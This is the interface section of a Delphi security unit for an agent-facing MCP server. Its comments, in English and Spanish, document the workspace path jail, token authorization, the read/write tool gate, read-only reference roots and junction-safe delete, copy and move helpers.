unit Lsp.Guard;

{ Access control: the security unit. Three layers, all configured in
  settings.ini next to the exe (env vars take precedence):

  1. Workspace jail - [Workspace] Roots / DELPHI_MCP_ROOTS. With roots
     configured, EVERY tool that touches the disk must stay inside them;
     paths are canonicalized so ..\ tricks and prefix cousins do not escape.
     No roots = unrestricted (local trusted mode).

  2. Credentials - SOLO tokens por workspace ([Workspace.<nombre>] Token= /
     ReadOnlyToken=). Sin coincidencia, 401: no hay anonimo ni modo abierto
     (v0.98). Enforced by the HTTP transport; this unit reads and caches.

  3. Read-only gate - ToolCallDenied is THE single entry gate, consulted by
     the tools dispatcher before ANY tool executes. The read/write
     classification of every tool lives HERE and nowhere else.

  4. Reference projects - [Workspace.<name>] ReadOnlyRoots (David,
     2026-09-25): folders OUTSIDE Roots that this workspace may READ as if
     they were its own and NEVER write. This is the door through which
     remote agents will see the house's REAL projects as code references,
     so the contract is spelled out:
       - One list, its own (WorkspaceReadOnlyRoots), parsed by the same
         reader as Roots. One locator (ReadOnlyRootOf) answers "is this
         path in a reference?" for the gate, the temp folders and
         delphi_projects. Nobody re-derives it.
       - JaulaDenegada (the READ question) lets a reference through like a
         root: the vault, path anomalies and a junction that leaves the
         reference are still refused, with the same RealPath check the
         roots get (a link planted inside a reference opens nothing).
       - PathDenied (the WRITE question) asks JaulaDenegada first and then
         checks the reference list BEFORE the roots, so a reference WINS:
         a folder declared in both lists, or a root that lies inside a
         reference, is read-only. Until 1.7.3 this was one gate with a
         table of pardons by reason (mvReferencia); since 1.7.4 there is
         no pardon to get right.
       - Every tool that WRITES goes through PathDenied and therefore
         refuses a reference: edit, textedit, create, changeset, move (also
         copy=true, both ends), delete, upload, build, test run, package,
         deploy, remote-run, designer to-text/to-binary, styles build,
         config (everything but view), rename apply, desktop out=.
       - Every tool that READS goes through ReadPathDenied and therefore
         enters: read, list, search, fetch and the /files route, symbols,
         definition, references, hover, signature, completion, diagnostics
         (the LSP config is cached under LOCALAPPDATA, never next to the
         project), designer tree/get/lint/check-binding/layout, config
         view, test discover, rename preview, and the QUERY half of git
         (GitCommandIsQuery - the one classification, shared with the
         read-only credential).
       - Temp files (AgentTempDir) never land in a reference, its drive
         letters are served (srvX:) like the roots', and the [RutaDelServidor]
         floor (ArgPathOutsideDenied) uses the read gate, so it lets them in.
       - What it does NOT do: subtract. Everything under a reference root is
         readable, secrets included - point it at clean project folders.
     Measured by tests/test_readonly_roots.py (two servers). }

interface

uses
  System.Classes,
  System.JSON,
  Lsp.Discovery; // TRadStudioInfo for IdeMacroVars

{ '' = allowed; otherwise the rejection message to return to the agent.
  This is the WRITE jail: only the configured workspace roots. }
{ True = leave this tool OUT of tools/list under the active [Tools] profile
  or allowlist. Listing only - the tool stays callable; permissions are
  ToolCallDenied's job. delphi_help/messages/report always stay listed. }
function ToolHiddenFromList(const AToolName: string): Boolean;

const
  { Lo mas larga que puede ser una ruta que se ESCRIBE: MAX_PATH (259) menos
    el sufijo temporal del escritor atomico (27). Leer no tiene tope. }
  RUTA_ESCRIBIBLE_MAX = 259 - 27;

{ La medida del escritor atomico (GUARD-028): '' si cabe. La preguntan
  WriteTargetDenied (el DESTINO que nombra el agente, antes de crear
  carpetas) y el propio escritor (AtomicWrite y su ensayo). NUNCA en
  PathDenied: alli se perdonaba al leer y abria la jaula a la lectura de
  toda ruta larga, y median tambien las copias de la papelera, que
  TFile.Copy escribe hasta MAX_PATH entero (1.7.2; undecima revision). }
function RutaLargaDenegada(const APath: string): string;

{ El comando efectivo de delphi_test: sin command, "project" (y sin path)
  significa run y lo demas discover. LA regla de la tool, aqui para que la
  puerta de solo lectura la aplique igual: '' + project llegaba al
  constructor y lo paraba el escritor (undecima revision, r11c). }
function ComandoDeTest(const ACmd, AProject, APath: string): string;

{ LA PREGUNTA DE LECTURA: "esta ruta cae dentro de lo que esta sesion puede
  LEER?" - las raices, las referencias (ReadOnlyRoots) y la zona de
  biblioteca (RTL/VCL y componentes registrados, si esta abierta), sin un
  enlace que salga, sin el vault y sin anomalias de nombre. Sin motivos ni
  perdones: lo que aqui se niega no lo perdona nadie, y aqui NO se anade
  nunca una regla de escritura. Hasta la 1.7.3 era "PathDenied menos una
  tabla de perdones por motivo": cada regla nueva tenia que caer en el sitio
  correcto respecto a esa tabla, y el tope de rutas largas de la 1.7.2 cayo
  antes de la jaula con un perdon y abrio la lectura de toda ruta larga
  (undecima revision; David: "dos preguntas, dos helpers"). }
function JaulaDenegada(const APath: string): string; overload;

{ LA PREGUNTA DE ESCRITURA: la jaula (JaulaDenegada) y DESPUES lo que solo
  importa al escribir - una referencia se lee y no se toca, un ReadOnlyPaths
  igual, la zona de biblioteca nunca se escribe, el confinamiento por
  agente. Las reglas de escritura se anaden aqui, y da igual en que orden:
  la jaula ya paso, una regla mal puesta niega de mas y nunca abre. Los
  escritores preguntan por EscrituraDenegada (suma el modo solo lectura) y
  WriteTargetDenied (suma temporales, papelera y la medida del escritor). }
function PathDenied(const APath: string): string;

{ La puerta de las tools que LEEN (read/search/list/fetch/LSP): la jaula tal
  cual, mas la pista de la zona de biblioteca en la negativa de fuera. }
function ReadPathDenied(const APath: string): string;

{ The configured roots (empty array = unrestricted). }
function WorkspaceRoots: TArray<string>;

{ Carpetas de DENTRO de la jaula que se leen pero no se escriben: el
  ReadOnlyPaths= del workspace activo. Vacio = ninguna, que es el
  comportamiento de siempre. Mismo trato que la zona de biblioteca del IDE:
  las tools de lectura entran, las de escritura no. }
function WorkspaceReadOnlyPaths: TArray<string>;

{ Proyectos de REFERENCIA: el ReadOnlyRoots= del workspace activo (o
  DELPHI_MCP_READONLY_ROOTS en el modo local). Carpetas FUERA de Roots que
  las tools de lectura recorren como si fueran suyas - leer, buscar,
  simbolos, definicion, git de consulta, fetch - y las de escritura no tocan
  jamas: ni edit, ni build (escribe dcu/exe), ni temporales. La idea (David,
  25-sep-2026): un agente trabaja en sus roots y ademas VE otros proyectos
  de la casa para aprender como se hacen las cosas. Separado de Roots a
  proposito, y MANDA sobre Roots: una carpeta en los dos sitios, o una raiz
  dentro de una referencia, es de solo lectura ('lo que tienes mas claro es
  lo que quieres readonly'). }
function WorkspaceReadOnlyRoots: TArray<string>;

{ La raiz de referencia que contiene APath ('' = ninguna). EL sitio que sabe
  si una ruta es de referencia: lo usan la guarda, los temporales y
  delphi_projects. }
function ReadOnlyRootOf(const APath: string): string;

{ Por que el servidor no llega AHORA a una raiz o referencia del workspace,
  sin salir a la red: '' si llega - o si saberlo pediria salir -; si no, el
  motivo. Dos casos: su LETRA no esta conectada en este proceso (la tabla de
  unidades, ClaseDeLetra de Lsp.NetDrives) o, en una unidad LOCAL, su carpeta
  no existe. En una letra de red conectada no se mira la carpeta: un recurso
  que no contesta tarda lo que Windows quiera. Lo listan delphi_workspace y
  delphi_projects (Hermes, 5-oct-2026: una referencia en una letra sin montar
  salia listada como si estuviera). }
function MotivoRaizNoDisponible(const ARaiz: string): string;

{ La negativa de una ruta que cae en una raiz o referencia cuya LETRA no esta
  conectada en este proceso (WS-022); '' si no es el caso. Sin disco ni red:
  va en la puerta de cada llamada (ArgPathOutsideDenied). }
function RaizEnLetraNoConectada(const APath: string): string;

{ Bearer authorization - the ONE place that knows every credential: the
  per-workspace tokens from
  [Workspace.<name>] sections (Token= read-write inside its Roots,
  ReadOnlyToken= read-only inside its Roots). True = allowed; AReadOnly and
  AWorkspaceIx (-1 = every root, the operator) describe the scope the request
  gets. A workspace whose Roots failed to parse admits NOBODY (fail closed).
  Workspaces may OVERLAP - one can hold a whole tree and another a subfolder
  of it: each token's jail is the union of ITS OWN roots and nothing is ever
  subtracted for belonging to another workspace too. }
function AuthorizeBearer(const AAuth: string; out AReadOnly: Boolean;
  out AWorkspaceIx: Integer): Boolean;

{ Scopes THIS worker thread to a workspace (-1 = none: operator/stdio).
  Worker threads are reused, so the host calls this on EVERY request. }
procedure SetRequestWorkspace(AIx: Integer);

{ The active workspace's name ('' = none) - for delphi_workspace and logs. }
function CurrentWorkspaceName: string;
{ La ruta del settings.ini: UN nombrador (estaba compuesta a mano en tres
  sitios de esta unidad, 24-sep-2026). Lo lee LoadSecurity al arrancar y lo
  mira delphi_workspace para avisar de que el fichero cambio despues. }
function SettingsIniPath: string;

{ [Log] LinesPerFile / MaxFiles tal cual los trae el settings.ini (2000 y
  10 si no estan), leidos por el lector central, LoadSecurity. Los usa
  Lsp.LogSink; hasta el 26-sep los leia la bandeja con su propio TIniFile. }
procedure LogIniSettings(out ALinesPerFile, AMaxFiles: Integer);

{ True when any [Workspace.*] token is configured (counts as a credential
  for the fail-safe bind decision). }
function WorkspaceTokensConfigured: Boolean;

{ Startup lines about the workspace config: which workspaces loaded (the
  workspaces listed by name over the global
  roots - one mechanism, two spellings) plus a warning per misconfiguration
  (misspelled section, tokenless workspace, unparseable roots). Empty when
  there is nothing to say. }
function WorkspaceStartupNotes: TArray<string>;

{ One-line human summary of the WRITE jail for the startup log (the single
  source of how the jail is described). AWarning is set when the state
  deserves a warning level: no jail at all (unrestricted) or fail-closed
  (Roots= had text but resolved to nothing). Paths are shown REAL here - the
  log goes to the operator's own stderr on the server, not to a client. }
function WorkspaceJailSummary(out AWarning: Boolean): string;
{ Por que ESTA llamada no admite nada, '' si no esta cerrada: el modo local
  (un proceso sin workspace activo) cerrado al cargar - una proteccion del
  entorno que no se cargo, o el token de un workspace cerrado. UN lector: la
  jaula, el resumen del arranque y delphi_workspace. }
function ModoLocalCerrado: string;
{ ...y su negativa (GUARD-030), '' si no esta cerrada: LA frase de quien
  niega por el cierre - la jaula, la pasada de los UNC y lo que recorre las
  raices sin pasar por una ruta (delphi_projects sin root). }
function NegativaDeCierre: string;

{ The READ-ONLY library zone (RAD Studio installations, IDE library search
  paths, GetIt catalog repositories). Readable by reading tools, never
  writable - exposed so delphi_workspace can tell the agent what it may read
  besides the roots (field round 4, R4-B). }
function LibraryReadRoots: TArray<string>;

{ The IDE's macro table for one installation ($(BDS), $(BDSLIB),
  $(BDSUSERDIR), $(BDSCOMMONDIR), $(BDSCatalogRepository)...), the same one
  the library zone is built from. ADest receives Name=Value pairs. }
procedure IdeMacroVars(const AInfo: TRadStudioInfo; ADest: TStrings);

{ The IDE's Library Search Path of ONE platform, every entry expanded to a
  real folder (macros resolved, no trailing delimiter), in registry order.
  Entries that still carry an unresolved macro or are not rooted are left
  out. What "delphi_components platform=X" shows and what the F2613 helper
  of delphi_build compares against. AValor es la lista del IDE que se lee:
  'Search Path' (la de siempre) o 'Browsing Path', la del fuente que el IDE
  ensena (las tablas del disenador leen las dos: Lsp.DesignerMetaGen). De
  ESA instalacion, la que se le da - la del servidor, DiscoverRadStudio:
  hasta el 5-oct-2026 la buscaba por su numero entre todas. }
function IdePlatformLibraryPaths(const AInfo: TRadStudioInfo; const APlatform: string;
  const AValor: string = 'Search Path'): TArray<string>;

{ EL NOMBRADOR DE LOS TEMPORALES, hermana de __delphi-patch y con la misma
  disciplina: el nombre de la carpeta se escribe en UN SITIO y nadie compone
  una ruta de temporales a mano.

  Por que existe: hasta el 2026-09-21 el servidor escribia sus temporales en
  el %TEMP% de la MAQUINA, en siete sitios distintos y a mano. Medido ese
  dia: 56,4 MB olvidados ahi fuera de toda jaula -33 capturas del escritorio
  del operador de dos dias antes y una salida de remoterun de 10,7 MB-, y un
  fichero de 10 bytes que una bateria se dejo suelto acabo siendo el
  "proyecto" de las units de otras tres. Un temporal repartido no se purga
  nunca.

  DOS CASAS, y el criterio es el mismo que separa a __delphi-temp de
  __delphi-patch:

    ServerTempDir  lo que es del SERVIDOR y el agente no toca nunca (el
                   fichero del mensaje de git, la descarga de un SDK, el
                   guion que se manda a un target). Va JUNTO AL EJECUTABLE,
                   como reports\ y settings.ini, y se puede borrar en
                   cualquier momento: nada de lo que hay ahi sobrevive a la
                   llamada que lo creo. No pasa por la jaula porque no es
                   una ruta que elija nadie de fuera.

    AgentTempDir   lo que el agente tiene que ALCANZAR: una captura que se
                   baja con delphi_fetch, una salida que se lee. Va DENTRO
                   del workspace, porque delphi_fetch comprueba la jaula y
                   un entregable fuera de ella es un entregable que no se
                   puede entregar (medido: el flujo documentado de
                   delphi_desktop estaba roto de punta a punta). Y con la
                   carpeta del agente, porque una jaula puede estar
                   compartida por varios: la captura de uno no se le pone
                   delante a otro.

  Componen la ruta y ya: crear la carpeta es de quien la use. }
function TempFolderName: string;
{ <carpeta del exe>\ASub: LA casa del servidor. Todo lo que el servidor
  guarda o busca junto a si mismo (settings.ini, __delphi-temp, logs,
  messages, reports, node, el conversor de estilos) se compone aqui; hasta
  el 26-sep lo componian a mano ocho sitios. Sin ASub, la carpeta. }
function ServerDir(const ASub: string = ''): string;
function ServerTempDir(const ASub: string = ''): string;
{ <LOCALAPPDATA>\DelphiLspMcp\ASub: las caches del servidor que no van junto
  al exe (las configuraciones que se fabrican para el motor, los estilos por
  defecto de la plataforma). Las componian a mano dos sitios. Lee la
  variable en cada llamada: quien la redirige (una prueba) la ve. }
function ServerCacheDir(const ASub: string = ''): string;
{ Un fichero de una de las casas del servidor (sus caches: la configuracion
  fabricada para el motor, las tablas del disenador) ENTERO o nada: se
  escribe al lado y se renombra encima, porque otro hilo puede estar
  leyendolo en ese momento. Si el renombrado no puede (alguien lo tiene
  abierto) y el fichero ya esta, vale el que esta; sin ninguno, se lanza el
  error. Es casa del servidor: no pasa por la jaula. Las dos copias de esto
  (Lsp.ConfigFabricator y el generador de las tablas) eran la segunda vez. }
procedure EscribeEnCasaDelServidor(const AFichero, ATexto: string);

{ LA clave corta de una carpeta, por su ruta CANONICA (larga, sin barra
  final, en minusculas): la misma carpeta escrita en 8.3 o con otras
  mayusculas da la misma clave, el MD5 en hexadecimal (32). La usan quien
  reclama una carpeta mientras vive (TemporalEsMia, SoyLaPrimeraInstancia)
  y la marca de los contenedores de delphi_test (Lsp.Sandbox). Estaba
  compuesta de tres formas, dos sin canonizar (revision de la 1.11.0). }
function ClaveDeCarpeta(const ADir: string): string;
{ EL nombre del mutex de una clave del servidor ('Global\DelphiLspMcp-' +
  AClave), el que ven todas sus instancias, el servicio y las de stdio: lo
  usan quien reclama algo mientras vive (ReclamaNombre) y quien hace algo de
  uno en uno entre procesos (la generacion de las tablas del disenador). }
function NombreDeMutex(const AClave: string): string;
function AgentTempDir(const ASub: string = ''): string;

{ TRES CLASES DE ESCRITURA, y lo que las separa es QUIEN COMPONE LA RUTA
  (David, 28-sep-2026):
  1. LA CASA DEL SERVIDOR (ServerDir: reports, el buzon, los logs, los jobs
     de remote-run, el mensaje de un commit, node.ver) y las otras casas que
     no son del workspace (los perfiles y las fichas de SDK del IDE, las
     caches de %LOCALAPPDATA%, el vault con su propia puerta VaultWritable).
     La ruta la compone el servidor con su nombrador y el agente nunca la
     nombra: lo que aporta (un titulo, un nombre de agente o de perfil, el
     nombre de un proyecto para su cache) pasa por Slug, una regex o queda
     acotado a UN tramo sin separadores. A la puerta de escritura NO se le
     pregunta, y no hay un lector de "es la casa?": nadie lo necesita. La
     puerta responde "puede ESTA SESION escribir aqui?", y la casa no es de
     la sesion ni del workspace.
  2. LO QUE NOMBRA EL AGENTE, y lo que el servidor deriva de ello (el .dproj
     de la unit, los gemelos, la copia recuperable): la puerta a la entrada
     (PathDenied y sus dos sumas, WriteTargetDenied y EscrituraDenegada).
     Los escritores atomicos vuelven a preguntar por su cuenta (AtomicWrite,
     BackupFile); un primitivo crudo corre solo sobre la ruta que la puerta
     acaba de aprobar.
  3. LOS ARTEFACTOS NUESTROS DENTRO DEL WORKSPACE, que son de dos clases:
     - los ENTREGABLES (las capturas): los coloca el nombrador
       (CasasDeEntregables / AgentTempDir: solo el __delphi-temp de una
       raiz ESCRIBIBLE) y los reconoce el MISMO nombrador al consumirlos
       (CapturaConsumible): sin puerta, ni al escribir ni al borrar. Por eso
       una referencia nunca recibe capturas ni pierde las suyas al leerlas
       (auditoria 25-sep-2026), y por eso un agente confinado consume las
       suyas: hasta la 1.7.3 el consumo preguntaba a PathDenied, el
       confinamiento negaba __delphi-temp y las capturas de un agente
       confinado no se borraban nunca (duodecima revision).
     - la PAPELERA y las marcas de dueno: pasan por la puerta del escritor
       como cualquier escritura (una referencia no recibe papelera).
  El error a no repetir: un solo if que mezcle la pregunta del agente (la
  puerta) con la del servidor (su nombrador). Cada pregunta, a su lector. }
{ Donde viven los ENTREGABLES: el __delphi-temp de cada raiz ESCRIBIBLE (una
  referencia o un ReadOnlyPaths nunca). El escritor (AgentTempDir) usa la
  PRIMERA; el lector (CapturaConsumible) acepta cualquiera. Sin ninguna, la
  temporal de la casa del servidor. }
function CasasDeEntregables: TArray<string>;
function CasaDeEntregables(out AEnElServidor: Boolean): string;

{ Una CAPTURA (escritorio o Android) en una carpeta temporal del servidor (un
  .png bajo <...>\__delphi-temp\...\desktop|android\) se CONSUME al recogerla: quien la
  baja - delphi_fetch al servir el ultimo trozo, GET /files - la borra.
  David, 25-sep-2026: 'lo mas sensato es borrar la captura una vez la ha
  recogido el agente, asi de simple; nada de caches ni rotaciones ni guardar
  nada; quiere otra, que la pida'. Medido el mismo dia: 10 gestos = 41 MB en
  la raiz del workspace, purgados solo al reiniciar. Una captura pedida con
  out= explicito NO esta en esa carpeta y no se toca. }
const
  // Las subcarpetas de captura: las pasa quien llama a CaptureTarget y las
  // reconoce IsAgentCapture. UNA lista - hasta el 25-sep-2026 el reconocedor
  // solo sabia de 'desktop' y las capturas de delphi_adb ('android') se
  // acumulaban sin consumirse.
  CAPTURE_SUB_DESKTOP = 'desktop';
  CAPTURE_SUB_ANDROID = 'android';

function IsAgentCapture(const APath: string): Boolean;
{ Una captura es NUESTRA si esta donde nuestro nombrador la deja: bajo la
  casa de entregables de este workspace, por la ruta real (una referencia o
  un enlace nunca lo son). EL decisor del consumo: quien borra
  (ConsumeAgentCapture) y quien lo anuncia (delphi_fetch, la imagen en linea)
  preguntan aqui; hasta la 1.7.3 el anuncio lo calculaba por su cuenta y decia
  "consumida" de una captura que seguia en disco (duodecima revision). }
function CapturaConsumible(const APath: string): Boolean;
function ConsumeAgentCapture(const APath: string): Boolean; // nunca lanza; True = borrada

{ DONDE CAE UNA CAPTURA: el "out" de toda la familia (delphi_desktop,
  delphi_adb_linux, delphi_adb), resuelto en UN sitio. Hasta la v1.0.13 era
  una CARPETA en los dos escritorios y un FICHERO obligatorio acabado en
  ".png" en delphi_adb - misma idea, mismo nombre de parametro, contrato
  distinto - y el nombre del fichero se componia a mano en tres sitios. Un
  agente que pasaba out=...\captura.png a delphi_desktop conseguia una
  CARPETA llamada captura.png.

    vacio                          -> AgentTempDir(ASub), nombre nuestro
    carpeta que existe, o acaba \  -> esa carpeta, nombre nuestro
    sin extension                  -> carpeta nueva, nombre nuestro
    extension = la de la captura   -> ESE fichero
    otra extension                 -> RECHAZADO, nombrando el formato real

  AExt es la extension REAL de la captura (con su punto), la que trae lo
  que devolvio el nodo o el dispositivo: aqui no hay ningun "png" escrito.
  Si un dia un nodo devuelve otro formato, la regla sigue valiendo y nadie
  recibe una imagen con la extension de otra (David, 2026-09-21: "y si un
  dia no es png?"). Devuelve '' y el fichero final en AFile, o la negativa.
  Un destino que elige quien llama pasa por PathDenied; el nuestro no, que
  ya sale de AgentTempDir. No crea nada: crear la carpeta es de quien la use. }
function CaptureTarget(const AOut, ASub, APrefix, AExt: string;
  out AFile: string): string;

{ Borra un arbol entero SIN CRUZAR ENLACES: un junction/symlink que haya
  dentro se elimina como ENTRADA (cae el enlace, jamas su destino). El
  TDirectory.Delete recursivo de la RTL entra en cualquier cosa con el bit
  de directorio sin mirar el de reparse (System.IOUtils,
  WalkThroughDirectory) y borra los ficheros DEL DESTINO: un junction
  plantado en la jaula apuntando fuera convertia cualquier borrado
  recursivo en un borrado FUERA de la jaula (auditoria 2026-09-21). Habia
  SEIS borrados recursivos sueltos por el codigo; este es ahora el unico,
  y quien necesite tirar un arbol pasa por aqui. Limpia atributos
  (solo-lectura) como hacia la RTL - los objetos de un .git vienen asi.
  Lanza si no puede: que cada llamador decida si tragarselo.

  Y desde el 25-sep-2026 LANZA TAMBIEN SI NO DEBE: antes de tocar nada pasa
  por BorradoDenegado (abajo). No hay otra forma de borrar un arbol. }
procedure BorraArbol(const ADir: string);

{ LAS carpetas desechables del servidor, por nombre de segmento: lo UNICO
  dentro de lo que BorraArbol borra (hoy la temporal y la papelera). Una
  lista: si manana nace otra (una cache, un spool), se anade AQUI y el guard
  la conoce, sin tocar la logica (David, 25-sep-2026). Todas empiezan por
  __: es la tercera barrera de BorradoDenegado. }
function CarpetasDesechables: TArray<string>;

{ EL trozo unico de un nombre que el servidor crea para UNA operacion (una
  carpeta de su temporal, el intermedio de una escritura, un zip a medias):
  8 hexadecimales en minusculas de un GUID. Estaba escrito a mano en siete
  sitios (revision de la 1.11.0, 2-oct-2026); su lector es
  FRAGMENTO_UNICO_PATRON. }
function FragmentoUnico: string;

{ EL sello de UNA operacion que tiene que ordenarse por cuando nacio y no
  chocar con otra del mismo milisegundo: 'yyyymmdd-hhnnsszzz-' +
  FragmentoUnico. Lo llevan el id de un trabajo de remote-run y el nombre de
  una captura; su lector es SELLO_UNICO_PATRON (la nota del deploy
  bloqueado lo busca en lo que contesta msbuild). }
function SelloUnico: string;

const
  // las formas de los dos de arriba, para quien las BUSCA: la inversa del
  // nombrador, nunca otra copia escrita a mano
  FRAGMENTO_UNICO_PATRON = '[0-9a-f]{8}';
  SELLO_UNICO_PATRON = '[0-9]{8}-[0-9]{9}-' + FRAGMENTO_UNICO_PATRON;

{ EL nombrador de la carpeta de descarga temporal ('__tmp-' + 8 hex) que
  crea quien baja algo de un target, y su lector: la unica carpeta fuera de
  una desechable que BorraArbol acepta, porque la acaba de crear el servidor. }
function NuevaCarpetaDescarga(const ADentroDe: string): string;
function EsCarpetaDescarga(const ANombre: string): Boolean;

{ EL normalizador de lo que un CLIENTE nombra y acaba en el disco (el
  agente de un buzon o de un informe, el titulo de un informe): letras y
  cifras ASCII, el resto se junta en un guion, 40 como mucho, minusculas.
  Nada del valor crudo llega al sistema de ficheros. Uno solo: estaba
  copiado identico en Mcp.Tools.Messages y Mcp.Tools.Report (25-sep-2026). }
function Slug(const S: string): string;

{ LOS sitios que un borrado o una mudanza nunca pueden SER ni CONTENER: toda
  raiz de workspace (de escritura y de referencia, de cualquier workspace, y
  las del modo local) y sus carpetas de solo lectura (ReadOnlyPaths), el
  vault, la carpeta del servidor, Windows, Archivos de programa y la carpeta
  del usuario. Una lista: un sitio sagrado nuevo se anade AQUI. }
function LugaresProtegidos: TArray<string>;

{ La decision de BorraArbol, sola: '' = ADir se puede borrar entero; si no,
  el motivo. (1) LISTA BLANCA: tiene que estar DENTRO de una carpeta
  desechable (nunca la carpeta misma) o ser/estar en una carpeta de
  descarga. (2) LISTA NEGRA: no puede ser ni contener un lugar protegido, ni
  ser una unidad o un recurso compartido entero. Se evalua sobre la ruta
  REAL del padre + el nombre: un junction en el camino no hace pasar por
  temporal lo que no lo es, y quitar un enlace (que nunca toca lo de detras)
  se juzga por donde esta el enlace. }
function BorradoDenegado(const ADir: string): string;

{ Vacia una carpeta DESECHABLE (temporal o papelera: CarpetasDesechables) sin
  borrarla, por el borrador con guard. Nunca una que sea un enlace (seria
  vaciar lo de detras) ni una de otro nombre. Nunca lanza. EL vaciador: la
  purga del arranque y la copia de carpetas (que no se lleva la papelera del
  origen) pasan por aqui (25-sep-2026).
  ACorte (CorteDePurga; 0 = todo): se deja lo que tenga algo creado o
  escrito desde ese momento - un fichero, o una carpeta con CUALQUIER cosa
  reciente debajo, entera. Es la purga de una raiz en una unidad de red,
  donde el servidor de OTRA maquina puede estar usando esa temporal y no
  hay cerrojo que cruce de una maquina a otra (1.9.0). }
procedure VaciaDesechable(const ADir: string; ACorte: UInt64 = 0);
{ El momento de hace AHoras, en la forma en que Windows guarda las fechas de
  un fichero (FILETIME, UTC): el corte de VaciaDesechable. }
function CorteDePurga(AHoras: Integer): UInt64;

{ Tamano y fecha de escritura de un fichero SIN abrirlo (FindFirst): se leen
  aunque otro proceso lo tenga abierto sin compartir. False si no esta. La
  usan la foto de los escritores y la de la carpeta de un test. }
function HuellaDeFichero(const ARuta: string; out ATam: Int64;
  out AFecha: TDateTime): Boolean;

type
  { Lo que el copiador NO copia, lo dice quien llama: True = fuera (un
    fichero o una carpeta, por su ruta de origen). Se pregunta LO ULTIMO,
    por lo que se va a copiar de verdad (la regla de enlaces ya ha dicho
    que si): quien cuenta lo copiado lo cuenta aqui, y puede lanzar para
    cortar la copia entera - un tope de tamano. }
  TOmiteAlCopiar = reference to function(const APath: string): Boolean;

{ EL copiador de arboles: copia AOrigen en ADestino SIN FUGAS DE LECTURA. Un
  enlace (junction o symlink, de carpeta o de fichero) se sigue SOLO si su
  destino real pasa la puerta de lectura de la sesion (ReadPathDenied): sus
  raices, sus ReadOnlyRoots, la zona de biblioteca. Si no, no se copia y va
  a ANoSeguidos. TDirectory.Copy de la RTL seguia cualquier junction: uno
  plantado en una carpeta (un git clone con enlaces lo mete sin consola)
  copiaba DENTRO de la jaula lo que la jaula no deja leer (25-sep-2026;
  David: 'solo se puede escribir en tu workspace, incluye copiar', y leer
  fuera es lo que el operador declara, 'ReadOnlyRoots es para eso').
  AConPapelera: si copia tambien las papeleras (__delphi-patch) que haya
  dentro. Un bucle de enlaces se corta por la ruta real ya visitada. Lanza si
  no puede copiar. ASigueEnlaces=False: un enlace de DENTRO no se sigue (va
  a ANoSeguidos): la copia de seguridad de un move, que los lleva como
  enlaces; una junction a la raiz dentro de la carpeta metia la copia en su
  propia papelera y el move fallaba (novena revision). AOmite (opcional):
  lo que quien llama deja fuera - delphi_test no se lleva los .dcu a la
  carpeta de su contenedor. Un parametro del copiador, no otro copiador. }
procedure CopiaArbol(const AOrigen, ADestino: string; AConPapelera: Boolean;
  out ANoSeguidos: TArray<string>; ASigueEnlaces: Boolean = True;
  const AOmite: TOmiteAlCopiar = nil);

{ La decision de copy=true, sola: '' = se puede copiar AOrigen en ADestino.
  No, si ADestino cae DENTRO de AOrigen (se copiaria sin fin), ni si lo que
  se va a copiar ES o CONTIENE un proyecto (.dproj, .dpk, .dpr): un proyecto
  nunca vive en dos sitios (David, 24-sep-2026). Se mira lo que la copia VA
  a copiar: los enlaces con la misma regla que CopiaArbol (EnlaceLegible),
  sin la papelera, y un fichero suelto tambien (un .dproj copiado solo se
  colaba; el .dpr ni se contaba - auditoria 25-sep-2026). }
function CopiaDenegada(const AOrigen, ADestino: string): string;

{ P es un enlace (junction o symlink, de carpeta o de fichero). LA
  comprobacion: estaba escrita cuatro veces en esta unidad. }
function EsEnlace(const P: string): Boolean;
{ La ruta de un enlace se juzga por DONDE ESTA: la ruta REAL del padre + el
  nombre. Para quien tiene que saber donde esta DE VERDAD lo que le nombran
  (la purga de la papelera: un fichero nombrado a traves de un enlace que
  esta en la papelera es el vivo de detras). }
function RutaDelEnlace(const AFull: string): string;

{ El primer trozo de S partido por ASeps; '' si S es ''. S.Split(...)[0] a
  secas lee fuera del array cuando S es '' (Delphi devuelve un array
  VACIO): un Access violation medido el 25-ago en delphi_edit y parcheado
  en ESE sitio, y otra vez el 26-sep en delphi_textedit (una tanda con un
  ancla vacia y "occurrence"), con otros cinco Split()[0] sueltos. }
function PrimerTrozo(const S: string; const ASeps: array of Char): string;

type
  TVisitaRuta = reference to procedure(const APath: string);

{ Visita cada fichero y carpeta DEBAJO de ADir (no ADir) sin cruzar NUNCA un
  enlace: un enlace ni se visita ni se entra - tocarlo seria tocar lo de
  detras (SetFileSecurity sobre un junction etiqueta su destino). EL
  recorrido de quien tiene que tocar cada entrada de un arbol y no es borrar
  ni copiar (esos son BorraArbol y CopiaArbol): el etiquetado de integridad
  de delphi_test cruzaba un junction con soAllDirectories y bajaba la
  etiqueta de un fichero de FUERA de la jaula (medido en vivo, 25-sep-2026).
  Nunca lanza: una rama ilegible se salta.

  AAlEnlace (opcional) recibe cada enlace que se encuentra, sin entrar
  en el: para quien necesita SABER que hay uno antes de hacer algo que
  si lo cruzaria (quitar un worktree: git lo atraviesa, medido el
  26-sep-2026). Un parametro del recorredor, no otro recorredor. }
procedure RecorreSinEnlaces(const ADir: string; const AVisita: TVisitaRuta;
  const AAlEnlace: TVisitaRuta = nil);

{ LA regla de enlaces de quien RECORRE un arbol: se sigue solo si lo de
  detras se puede LEER en esta sesion. La usan el copiador, la decision de
  la copia y el recorredor de ficheros (delphi_search, delphi_list,
  delphi_projects, el zip de delphi_package): lo que se ensena, se busca o
  se empaqueta es lo que se podia leer. }
function EnlaceLegible(const P: string): Boolean;

{ Recorrido de lectura compartido: solo enlaces legibles, ciclos cortados y
  carpetas ilegibles toleradas. Las tools deciden sus filtros de artefactos. }
function WalkFiles(const ADir: string; const AMasks: TArray<string>;
  AConPapelera: Boolean = False): TArray<string>; overload;
function WalkFiles(const ADir, AMask: string;
  AConPapelera: Boolean = False): TArray<string>; overload;

{ EL mudador de carpetas: AOrigen pasa a ser ADestino RENOMBRANDOLA (MoveFile
  en la misma unidad) o NADA. No abre la carpeta ni toca sus ficheros: un
  junction de dentro viaja como enlace y lo de detras ni se mira; si algo
  de dentro esta abierto, falla entera y la carpeta sigue intacta. Lo que
  hacia TDirectory.Move de la RTL cuando no podia renombrar - copiar y
  borrar fichero a fichero ENTRANDO en los junctions - se trajo a la jaula
  y BORRO de su sitio el contenido de una carpeta de fuera (reproducido en
  vivo el 25-sep-2026, presente desde v0.16). Antes de tocar nada pasa por
  MovidoDenegado. No hay otra forma de mover un arbol: delphi_move y la
  papelera de delphi_delete pasan por aqui. Lanza si no debe o no puede. }
procedure MueveArbol(const AOrigen, ADestino: string);

